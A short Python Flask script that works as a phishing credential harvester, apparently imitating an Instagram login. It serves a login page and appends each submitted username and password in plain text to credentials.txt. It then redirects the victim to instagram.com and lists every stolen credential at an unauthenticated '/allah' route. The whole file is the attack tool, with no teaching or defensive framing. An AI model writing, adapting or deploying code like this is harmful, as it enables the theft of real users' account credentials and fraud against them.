from flask import Flask,request,render_template,redirect
app = Flask(__name__,static_url_path='/static',template_folder="templates")
@app.route('/',methods=['GET','POST'])
def login():
    if request.method=='GET':
        return render_template('index.html')
    if request.method=='POST':
        print(request.form)
        f=open("credentials.txt", "a+")
        data=request.form
        f.write(data['username']+' : '+data['password']+"\n")
        f.close()
        return redirect("http://www.instagram.com")
@app.route('/allah',methods=['GET'])
def allah():
    f=open("credentials.txt", "r")
    data=[]
    for i in f:
        data.append(i)
    return {'data':data}
if __name__=='__main__':
    app.run(debug=True)